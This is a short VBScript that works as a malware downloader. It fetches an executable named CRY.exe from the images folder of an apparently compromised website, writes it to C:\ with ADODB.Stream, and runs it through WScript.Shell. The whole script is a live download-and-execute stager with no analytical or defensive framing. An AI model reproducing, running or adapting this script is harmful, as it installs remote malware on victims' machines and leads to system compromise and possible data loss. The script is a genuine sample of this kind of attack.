dim http_obj
dim stream_obj
dim shell_obj
set http_obj = CreateObject("Microsoft.XMLHTTP")
set stream_obj = CreateObject("ADODB.Stream")
set shell_obj = CreateObject("WScript.Shell")
URL = "http://martaalvarenga.com.br/images/CRY.exe" 'Where to download the file from
FILENAME = "C:\CRY.exe" 'Name to save the file (on the local system)
RUNCMD = "C:\CRY.exe cmd.exe" 'Command to run after downloading
http_obj.open "GET", URL, False
http_obj.send
stream_obj.type = 1
stream_obj.open
stream_obj.write http_obj.responseBody
stream_obj.savetofile FILENAME, 2
shell_obj.run RUNCMD